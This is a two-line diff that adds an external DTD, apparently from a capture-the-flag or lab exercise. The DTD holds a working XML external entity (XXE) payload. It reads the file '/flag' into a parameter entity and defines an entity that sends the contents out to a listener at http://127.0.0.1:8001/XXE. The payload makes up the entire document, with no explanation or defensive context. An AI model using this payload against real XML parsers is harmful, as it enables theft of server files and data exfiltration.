@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "/flag">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1:8001/XXE?%data;'>">
